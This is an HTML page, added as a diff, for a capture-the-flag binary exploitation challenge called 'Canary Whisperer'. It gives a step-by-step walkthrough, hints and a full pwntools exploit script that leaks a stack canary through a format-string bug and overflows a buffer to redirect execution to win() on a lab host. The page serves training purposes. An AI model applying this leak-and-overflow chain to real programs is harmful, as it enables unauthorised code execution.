@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>FlagVault CTF — Canary Whisperer</title>
+  <link rel="stylesheet" href="style.css"/>
+  <!--
+    FLAGVAULT CTF // CANARY WHISPERER
+    challenge.flagvault.local:9008
+    build-ref: stack-canary-leak-001
+    note: "The canary sings before the stack dies."
+    clue: format string leaks stack[11] — that is your canary offset
+    b64-decoy: c3RhY2tfY2FuYXJ5X3doaXNwZXJlcg==
+  -->
+</head>
+<body>
+
+<!-- NAV -->
+<nav class="nav">
+  <a class="nav-brand" href="#">
+    <span class="bracket">[</span><span class="brand-flag">FLAG</span>VAULT<span class="bracket">]</span>
+  </a>
+  <ul class="nav-links">
+    <li><a href="#">Home</a></li>
+    <li><a href="#" class="active">Challenges</a></li>
+    <li><a href="#">Scoreboard</a></li>
+    <li><a href="#">Rules</a></li>
+  </ul>
+  <div class="nav-status">
+    <div class="status-dot"></div>
+    <span>LIVE</span>
+  </div>
+</nav>
+
+<!-- PAGE WRAP -->
+<div class="page-wrap">
+
+  <!-- HEADER -->
+  <div class="page-header" data-index="PWN">
+    <p class="page-eyebrow">// BINARY EXPLOITATION — STACK</p>
+    <h1 class="page-title">
+      <span class="hl">Canary</span> <span class="hl2">Whisperer</span>
+    </h1>
+    <p class="page-desc">Category: Binary Exploitation &nbsp;|&nbsp; Points: 350 &nbsp;|&nbsp; Difficulty: Medium</p>
+  </div>
+
+  <!-- STATS STRIP -->
+  <div class="stats-strip">
+    <div class="stat-box"><span class="stat-val">350</span><span class="stat-label">Points</span></div>
+    <div class="stat-box"><span class="stat-val red">27</span><span class="stat-label">Solves</span></div>
+    <div class="stat-box"><span class="stat-val amber">3</span><span class="stat-label">Hints</span></div>
+    <div class="stat-box"><span class="stat-val green">FMT</span><span class="stat-label">Leak Method</span></div>
+    <div class="stat-box"><span class="stat-val ornge">x64</span><span class="stat-label">Arch</span></div>
+    <div class="stat-box"><span class="stat-val blue">9008</span><span class="stat-label">Port</span></div>
+  </div>
+
+  <!-- TWO-COLUMN LAYOUT -->
+  <div id="main-layout" style="display:grid;grid-template-columns:1fr 360px;gap:2rem;">
+
+    <!-- LEFT COLUMN -->
+    <div>
+
+      <!-- DESCRIPTION -->
+      <div class="sec-divider"><h3>Challenge Description</h3></div>
+      <div class="ch-desc">
+        Stack canary is <strong style="color:var(--accent2)">enabled</strong>. NX is <strong style="color:var(--accent2)">enabled</strong>. <strong style="color:var(--accent)">No PIE</strong>.<br><br>
+        The program reads input <strong style="color:var(--accent3)">twice</strong>. The <strong style="color:var(--accent)">first input</strong> is printed back <strong style="color:var(--accent2)">unsafely</strong> via <code>printf(buf)</code> — use it to leak the canary via a format string. The <strong style="color:var(--accent3)">second input</strong> overflows a buffer — reuse the leaked canary to bypass the check and redirect <code>RIP</code> to <code>win()</code>.<br><br>
+        <code>nc challenge.flagvault.local 9008</code>
+      </div>
+
+      <!-- BINARY PROPERTIES -->
+      <div class="sec-divider"><h3>Binary Properties</h3></div>
+      <div style="background:var(--surface2);border:1px solid var(--border);padding:1.2rem 1.5rem;margin-bottom:1.5rem;display:flex;flex-wrap:wrap;gap:0.75rem;">
+        <span class="tag tag-purple">Arch: amd64-64-little</span>
+        <span class="tag tag-amber">RELRO: Partial</span>
+        <span class="tag tag-red">Stack: Canary found</span>
+        <span class="tag tag-red">NX: Enabled</span>
+        <span class="tag tag-green">PIE: No PIE</span>
+      </div>
+
+      <!-- GDB TERMINAL TYPEWRITER -->
+      <div class="sec-divider"><h3>GDB Session — Stack Layout Analysis</h3></div>
+      <div style="background:#030a0f;border:1px solid var(--border);border-radius:var(--radius);overflow:hidden;margin-bottom:2rem;">
+        <div style="background:var(--surface2);border-bottom:1px solid var(--border);padding:0.5rem 1rem;display:flex;align-items:center;gap:0.5rem;">
+          <span style="width:10px;height:10px;border-radius:50%;background:#ff5f57;display:inline-block;"></span>
+          <span style="width:10px;height:10px;border-radius:50%;background:#febc2e;display:inline-block;"></span>
+          <span style="width:10px;height:10px;border-radius:50%;background:#28c840;display:inline-block;"></span>
+          <span style="font-family:var(--font-mono);font-size:0.65rem;color:var(--text-dim);margin-left:0.5rem;">gdb ./canary_whisperer</span>
+        </div>
+        <div id="term-gdb" style="padding:1.2rem 1.4rem;font-family:var(--font-mono);font-size:0.76rem;line-height:2;color:var(--text);min-height:320px;"></div>
+      </div>
+
+      <!-- INTERACTIVE STACK VISUALIZER -->
+      <div class="sec-divider"><h3>Interactive Stack Frame Visualizer</h3></div>
+      <div style="background:var(--surface2);border:1px solid var(--border);padding:1.5rem;margin-bottom:2rem;">
+        <div style="font-family:var(--font-mono);font-size:0.62rem;letter-spacing:3px;color:var(--text-dim);text-transform:uppercase;margin-bottom:1.2rem;">
+          // vuln() stack frame — hover rows to inspect
+        </div>
+        <div id="stack-vis"></div>
+
+        <!-- Format String Probe Simulator -->
+        <div style="margin-top:1.4rem;border-top:1px solid var(--border);padding-top:1.2rem;">
+          <div style="font-family:var(--font-mono);font-size:0.62rem;letter-spacing:3px;color:var(--text-dim);text-transform:uppercase;margin-bottom:0.9rem;">// Format String Probe — simulate %N$p</div>
+          <div style="display:flex;gap:0.75rem;align-items:center;flex-wrap:wrap;margin-bottom:0.9rem;">
+            <div class="form-group" style="margin:0;">
+              <input id="probe-offset" class="form-control" value="11" style="width:72px;text-align:center;" oninput="updateFmt()"/>
+            </div>
+            <span style="font-family:var(--font-mono);font-size:0.8rem;color:var(--text-dim);">→ sends <span id="probe-fmt-label" style="color:var(--accent)">%11$p</span></span>
+            <button class="btn btn-primary" onclick="runProbe()" style="font-size:0.64rem;padding:0.5rem 1.1rem;letter-spacing:2px;">PROBE</button>
+            <button class="btn btn-danger"  onclick="probeReset()" style="font-size:0.64rem;padding:0.5rem 1.1rem;letter-spacing:2px;">RESET</button>
+          </div>
+          <div id="probe-output" style="font-family:var(--font-mono);font-size:0.75rem;line-height:1.9;min-height:48px;"></div>
+        </div>
+      </div>
+
+      <!-- EXPLOIT WALKTHROUGH -->
+      <div class="sec-divider"><h3>Exploit Walkthrough</h3></div>
+      <div class="challenges-list">
+
+        <div class="challenge-card" id="st1">
+          <div class="ch-header" onclick="toggleCard('st1')">
+            <span class="ch-id">01</span>
+            <span class="ch-difficulty diff-medium">Step 1</span>
+            <span class="ch-title">Identify the unsafe printf — format string vuln</span>
+            <span class="ch-toggle">▼</span>
+          </div>
+          <div class="ch-body">
+            <div class="ch-desc">
+              The first <code>read()</code> stores input in <code>buf1[64]</code>. The program then calls <code>printf(buf1)</code> with <strong style="color:var(--accent2)">no format specifier</strong>.<br><br>
+              Sending <code>%p.%p.%p...</code> leaks raw stack pointer values. The canary lives at a predictable stack offset from the format argument.
+            </div>
+            <div style="background:#030a0f;border:1px solid var(--border);padding:1rem 1.2rem;font-family:var(--font-mono);font-size:0.75rem;line-height:2;margin-top:0.6rem;">
+              <span style="color:var(--accent2)">$ </span><span style="color:var(--text)">nc challenge.flagvault.local 9008</span><br>
+              <span style="color:var(--text-dim)">[*] What's your name? </span><span style="color:var(--accent3)">%11$p</span><br>
+              <span style="color:var(--text-dim)">[*] Hello, </span><span style="color:var(--accent)">0x3a88f4c2e1f20d00</span><br>
+              <span style="color:var(--text-dim)">&nbsp;&nbsp;&nbsp;&nbsp;└─ ends in </span><span style="color:var(--accent2)">00</span><span style="color:var(--text-dim)"> → </span><span style="color:var(--accent)">stack canary!</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="challenge-card" id="st2">
+          <div class="ch-header" onclick="toggleCard('st2')">
+            <span class="ch-id">02</span>
+            <span class="ch-difficulty diff-medium">Step 2</span>
+            <span class="ch-title">Parse and validate the leaked canary value</span>
+            <span class="ch-toggle">▼</span>
+          </div>
+          <div class="ch-body">
+            <div class="ch-desc">
+              Stack canaries on x64 Linux <strong style="color:var(--accent)">always end in 0x00</strong>. This is the null-byte guard — it prevents string functions from leaking the canary accidentally.<br><br>
+              Parse the hex output and verify the LSB is <code>0x00</code>.
+            </div>
+            <div style="background:#030a0f;border:1px solid var(--border);padding:1rem 1.2rem;font-family:var(--font-mono);font-size:0.75rem;line-height:2;">
+              <span style="color:var(--accent2)"># Python — parse + validate</span><br>
+              <span style="color:var(--text-dim)">raw    = r.recvline_contains(b'Hello').split()[-1]</span><br>
+              <span style="color:var(--accent)">canary = int(raw, 16)</span><br>
+              <span style="color:var(--text-dim)">assert canary &amp; 0xff == 0, "Not a canary!"</span><br>
+              <span style="color:var(--accent3)">log.success(f'canary = {hex(canary)}')</span>
+            </div>
+            <!-- Live validator -->
+            <div style="margin-top:1rem;background:var(--surface2);border:1px solid var(--border);padding:1rem;">
+              <div style="font-family:var(--font-mono);font-size:0.62rem;letter-spacing:2px;color:var(--text-dim);margin-bottom:0.6rem;">// LIVE CANARY VALIDATOR</div>
+              <div class="form-group" style="margin-bottom:0.5rem;">
+                <label>Paste leaked hex value</label>
+                <input id="canary-inp" class="form-control" placeholder="0x3a88f4c2e1f20d00" oninput="validateCanary()"/>
+              </div>
+              <div id="canary-result" style="font-family:var(--font-mono);font-size:0.77rem;min-height:22px;"></div>
+            </div>
+          </div>
+        </div>
+
+        <div class="challenge-card" id="st3">
+          <div class="ch-header" onclick="toggleCard('st3')">
+            <span class="ch-id">03</span>
+            <span class="ch-difficulty diff-hard">Step 3</span>
+            <span class="ch-title">Build the overflow payload — canary + RIP</span>
+            <span class="ch-toggle">▼</span>
+          </div>
+          <div class="ch-body">
+            <div class="ch-desc">
+              The second buffer <code>buf2[64]</code> sits just below the canary on the stack. Overflow layout:<br><br>
+              <code>[64 bytes padding] + [8 bytes canary] + [8 bytes saved RBP] + [8 bytes RIP → win()]</code><br><br>
+              No PIE → <code>win()</code> is at a <strong style="color:var(--accent)">fixed address</strong>. Find it: <code>objdump -d ./canary_whisperer | grep win</code>
+            </div>
+            <div style="background:#030a0f;border:1px solid var(--border);padding:1rem 1.2rem;font-family:var(--font-mono);font-size:0.75rem;line-height:2;">
+              <span style="color:var(--accent2)"># Python — craft payload</span><br>
+              <span style="color:var(--text-dim)">win_addr = 0x401196&nbsp;&nbsp;&nbsp;</span><span style="color:var(--accent3)"># no PIE → fixed addr</span><br>
+              <span style="color:var(--text-dim)">payload  = b'A' * 64&nbsp;&nbsp;&nbsp;</span><span style="color:var(--accent3)"># fill buf2 to canary</span><br>
+              <span style="color:var(--accent)">payload += p64(canary)&nbsp;</span><span style="color:var(--accent3)"># canary intact → check passes</span><br>
+              <span style="color:var(--text-dim)">payload += p64(0)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color:var(--accent3)"># saved RBP (any value)</span><br>
+              <span style="color:var(--text-dim)">payload += p64(win_addr)</span><span style="color:var(--accent3)"># overwrite RIP</span>
+            </div>
+            <!-- Payload builder -->
+            <div style="margin-top:1rem;background:var(--surface2);border:1px solid var(--border);padding:1rem;">
+              <div style="font-family:var(--font-mono);font-size:0.62rem;letter-spacing:2px;color:var(--text-dim);margin-bottom:0.7rem;">// PAYLOAD BUILDER</div>
+              <div class="form-row">
+                <div class="form-group">
+                  <label>Canary (hex)</label>
+                  <input id="pb-canary" class="form-control" placeholder="0x3a88f4c2e1f20d00" oninput="buildPayload()"/>
+                </div>
+                <div class="form-group">
+                  <label>win() address (hex)</label>
+                  <input id="pb-win" class="form-control" value="0x401196" oninput="buildPayload()"/>
+                </div>
+              </div>
+              <div id="pb-result" style="font-family:var(--font-mono);font-size:0.72rem;line-height:1.9;margin-top:0.6rem;"></div>
+            </div>
+          </div>
+        </div>
+
+        <div class="challenge-card" id="st4">
+          <div class="ch-header" onclick="toggleCard('st4')">
+            <span class="ch-id">04</span>
+            <span class="ch-difficulty diff-very-hard">Step 4</span>
+            <span class="ch-title">Two-stage attack — leak → smash → win()</span>
+            <span class="ch-toggle">▼</span>
+          </div>
+          <div class="ch-body">
+            <div class="ch-desc">
+              Chain both stages in one pwntools script. Send the format string, receive the canary, immediately send the overflow payload with the canary at offset 64. The canary check passes → <code>win()</code> fires → flag.
+            </div>
+            <div style="background:#030a0f;border:1px solid var(--border);padding:1rem 1.2rem;font-family:var(--font-mono);font-size:0.75rem;line-height:2;">
+              <span style="color:var(--accent2)"># Chained two-stage</span><br>
+              <span style="color:var(--text-dim)">r.sendlineafter(b"name? ", b"%11$p")</span><br>
+              <span style="color:var(--text-dim)">raw    = r.recvline_contains(b"Hello").split()[-1]</span><br>
+              <span style="color:var(--accent)">canary = int(raw, 16)</span><br>
+              <span style="color:var(--text-dim)">payload = b'A'*64 + p64(canary) + p64(0) + p64(0x401196)</span><br>
+              <span style="color:var(--text-dim)">r.sendlineafter(b"input? ", payload)</span><br>
+              <span style="color:var(--accent)">r.interactive()&nbsp;&nbsp;</span><span style="color:var(--accent3)"># flag awaits!</span>
+            </div>
+          </div>
+        </div>
+
+      </div><!-- /steps -->
+
+      <!-- FULL EXPLOIT SCRIPT -->
+      <div class="sec-divider"><h3>Full Exploit Script</h3></div>
+      <div style="background:#030a0f;border:1px solid var(--border);border-radius:var(--radius);overflow:hidden;margin-bottom:2rem;">
+        <div style="background:var(--surface2);border-bottom:1px solid var(--border);padding:0.5rem 1rem;display:flex;align-items:center;justify-content:space-between;">
+          <span style="font-family:var(--font-mono);font-size:0.65rem;color:var(--text-dim);">exploit.py — pwntools skeleton</span>
+          <button onclick="copyExploit()" class="btn" style="font-size:0.58rem;padding:0.3rem 0.8rem;letter-spacing:1px;background:transparent;border:1px solid var(--border);color:var(--text-dim);">COPY</button>
+        </div>
+        <pre id="exploit-code" style="padding:1.2rem 1.4rem;font-family:var(--font-mono);font-size:0.73rem;line-height:1.9;color:var(--text);overflow-x:auto;white-space:pre;"><span style="color:#7c3aed">from</span> <span style="color:var(--accent)">pwn</span> <span style="color:#7c3aed">import</span> *
+
+HOST, PORT = <span style="color:var(--accent3)">'challenge.flagvault.local'</span>, <span style="color:var(--accent3)">9008</span>
+elf = ELF(<span style="color:var(--accent3)">'./canary_whisperer'</span>)
+r   = remote(HOST, PORT)
+
+<span style="color:var(--text-dim)"># stage 1 : leak canary via format string</span>
+r.sendlineafter(<span style="color:var(--accent3)">b"name? "</span>, <span style="color:var(--accent3)">b"%11$p"</span>)
+line   = r.recvline_contains(<span style="color:var(--accent3)">b"Hello"</span>)
+raw    = line.split(<span style="color:var(--accent3)">b" "</span>)[-1].strip()
+canary = int(raw, <span style="color:var(--accent3)">16</span>)
+assert canary & <span style="color:var(--accent3)">0xff</span> == <span style="color:var(--accent3)">0</span>, <span style="color:var(--accent3)">"Not a canary!"</span>
+log.success(f<span style="color:var(--accent3)">"canary = {hex(canary)}"</span>)
+
+<span style="color:var(--text-dim)"># stage 2 : overflow with canary intact</span>
+win_addr = elf.symbols[<span style="color:var(--accent3)">'win'</span>]   <span style="color:var(--text-dim)"># no PIE → static addr</span>
+payload  = flat(
+    <span style="color:var(--accent3)">b'A'</span> * <span style="color:var(--accent3)">64</span>,   <span style="color:var(--text-dim)"># pad to canary</span>
+    canary,      <span style="color:var(--text-dim)"># canary intact → check passes!</span>
+    <span style="color:var(--accent3)">0</span>,          <span style="color:var(--text-dim)"># saved RBP (clobber)</span>
+    win_addr     <span style="color:var(--text-dim)"># overwrite RIP → win()</span>
+)
+r.sendlineafter(<span style="color:var(--accent3)">b"input? "</span>, payload)
+r.interactive()
+</pre>
+      </div>
+
+      <!-- HINTS -->
+      <div class="sec-divider"><h3>Hints</h3></div>
+      <div class="hints-container">
+        <div class="hint-item" id="h1">
+          <button class="hint-toggle" onclick="revealHint('h1')">
+            <span class="hint-num">HINT 01</span>
+            Canaries always end in 0x00.
+            <span class="hint-cost">−0 pts</span>
+          </button>
+          <div class="hint-content">
+            A Linux x64 stack canary's least-significant byte is always <code>0x00</code>. This null-byte guard prevents string functions from leaking it accidentally. When you see a pointer-shaped value ending in <code>…00</code>, that is your canary.
+          </div>
+        </div>
+        <div class="hint-item" id="h2">
+          <button class="hint-toggle" onclick="revealHint('h2')">
+            <span class="hint-num">HINT 02</span>
+            Which %p offset is the canary on?
+            <span class="hint-cost">−20 pts</span>
+          </button>
+          <div class="hint-content">
+            In GDB, send <code>%1$p.%2$p...%15$p</code> and look for a value ending in <code>00</code>. For this binary the canary is at <strong>offset 11</strong>: use <code>%11$p</code> to leak it in one shot.
+          </div>
+        </div>
+        <div class="hint-item" id="h3">
+          <button class="hint-toggle" onclick="revealHint('h3')">
+            <span class="hint-num">HINT 03</span>
+            Exact byte layout for the second overflow.
+            <span class="hint-cost">−40 pts</span>
+          </button>
+          <div class="hint-content">
+            <code>buf2</code> is 64 bytes. Stack order: <code>[buf2 — 64B] [canary — 8B] [saved RBP — 8B] [saved RIP — 8B]</code>. Total bytes to reach RIP = 80. Place the leaked canary at offset 64, anything at 72, and <code>win()</code>'s fixed address at offset 80.
+          </div>
+        </div>
+      </div>
+
+      <!-- FLAG FORMAT -->
+      <div class="flag-format">
+        <span class="flag-icon">🚩</span>
+        <div>Flag format: <strong>FlagVault{your_flag_here}</strong></div>
+      </div>
+
+    </div><!-- /left -->
+
+    <!-- RIGHT SIDEBAR -->
+    <div>
+
+      <div style="background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:1.5rem;margin-bottom:1.5rem;">
+        <div style="font-family:var(--font-mono);font-size:0.62rem;letter-spacing:3px;color:var(--text-dim);text-transform:uppercase;margin-bottom:1rem;">Challenge Info</div>
+        <table style="width:100%;font-family:var(--font-mono);font-size:0.75rem;border-collapse:collapse;">
+          <tr style="border-bottom:1px solid var(--border);"><td style="color:var(--text-dim);padding:0.5rem 0;">Category</td><td style="color:var(--text-hi);text-align:right;">Binary Exploitation</td></tr>
+          <tr style="border-bottom:1px solid var(--border);"><td style="color:var(--text-dim);padding:0.5rem 0;">Vuln Type</td><td style="text-align:right;"><span class="tag tag-red">Format String</span></td></tr>
+          <tr style="border-bottom:1px solid var(--border);"><td style="color:var(--text-dim);padding:0.5rem 0;">Points</td><td style="color:var(--accent3);text-align:right;">350</td></tr>
+          <tr style="border-bottom:1px solid var(--border);"><td style="color:var(--text-dim);padding:0.5rem 0;">Difficulty</td><td style="text-align:right;"><span class="tag tag-amber">Medium</span></td></tr>
+          <tr style="border-bottom:1px solid var(--border);"><td style="color:var(--text-dim);padding:0.5rem 0;">Host</td><td style="color:var(--accent);text-align:right;font-size:0.65rem;">challenge.flagvault.local</td></tr>
+          <tr style="border-bottom:1px solid var(--border);"><td style="color:var(--text-dim);padding:0.5rem 0;">Port</td><td style="color:var(--accent);text-align:right;">9008</td></tr>
+          <tr><td style="color:var(--text-dim);padding:0.5rem 0;">Solves</td><td style="color:var(--accent2);text-align:right;">27</td></tr>
+        </table>
+      </div>
+
+      <!-- STACK LAYOUT REFERENCE -->
+      <div style="background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:1.5rem;margin-bottom:1.5rem;">
+        <div style="font-family:var(--font-mono);font-size:0.62rem;letter-spacing:3px;color:var(--text-dim);text-transform:uppercase;margin-bottom:1rem;">Stack Layout — vuln()</div>
+        <div id="stack-card-sidebar"></div>
+      </div>
+
+      <!-- TOOLS -->
+      <div style="background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:1.5rem;margin-bottom:1.5rem;">
+        <div style="font-family:var(--font-mono);font-size:0.62rem;letter-spacing:3px;color:var(--text-dim);text-transform:uppercase;margin-bottom:1rem;">Recommended Tools</div>
+        <div class="tools-grid" style="grid-template-columns:1fr 1fr;">
+          <div class="tool-card" style="--tool-color:var(--accent);">
+            <span class="tool-icon">🐧</span>
+            <div class="tool-name">pwntools</div>
+            <span class="tool-tag">Python</span>
+            <div class="tool-desc">Exploit dev</div>
+          </div>
+          <div class="tool-card" style="--tool-color:var(--accent3);">
+            <span class="tool-icon">🔍</span>
+            <div class="tool-name">GDB + peda</div>
+            <span class="tool-tag">Debugger</span>
+            <div class="tool-desc">Stack inspect</div>
+          </div>
+          <div class="tool-card" style="--tool-color:var(--accent2);">
+            <span class="tool-icon">📦</span>
+            <div class="tool-name">checksec</div>
+            <span class="tool-tag">Analysis</span>
+            <div class="tool-desc">Mitigations</div>
+          </div>
+          <div class="tool-card" style="--tool-color:var(--accent4);">
+            <span class="tool-icon">🗺️</span>
+            <div class="tool-name">objdump</div>
+            <span class="tool-tag">Disasm</span>
+            <div class="tool-desc">Find win()</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- RECENT SOLVERS -->
+      <div style="background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);overflow:hidden;">
+        <div style="padding:1rem 1.2rem;border-bottom:1px solid var(--border);font-family:var(--font-mono);font-size:0.62rem;letter-spacing:3px;color:var(--text-dim);text-transform:uppercase;">Recent Solvers</div>
+        <div id="solvers-list"></div>
+      </div>
+
+    </div><!-- /right -->
+  </div><!-- /main-layout -->
+
+  <!-- SUBMIT FLAG -->
+  <div class="submit-section">
+    <div class="submit-title">Submit Your Flag</div>
+    <p class="submit-sub">Bypassed the canary and reached win()? Enter your flag below.</p>
+    <div class="form-row">
+      <div class="form-group">
+        <label>Team / Username</label>
+        <input id="inp-user" class="form-control" placeholder="c4n4ry_wh1sp3r3r"/>
+      </div>
+      <div class="form-group">
+        <label>Challenge</label>
+        <select class="form-control">
+          <option>Canary Whisperer — Binary Exploitation</option>
+        </select>
+      </div>
+    </div>
+    <div class="form-group flag-input-wrap">
+      <span class="prefix">FlagVault{</span>
+      <input id="flag-input" class="form-control" placeholder="your_flag_here}" style="padding-left:7.8rem;"/>
+    </div>
+    <button class="btn btn-primary" onclick="submitFlag()">⚑ &nbsp;SUBMIT FLAG</button>
+    <div class="submit-result" id="flag-result"></div>
+  </div>
+
+</div><!-- /page-wrap -->
+
+<footer class="footer">
+  <div class="footer-brand">FLAG<span>VAULT</span> CTF</div>
+  <div class="footer-copy">© 2025 FlagVault &nbsp;|&nbsp; Binary Exploitation — Stack &nbsp;|&nbsp; Canary Whisperer</div>
+</footer>
+
+<script src="script.js"></script>
+</body>
+</html>
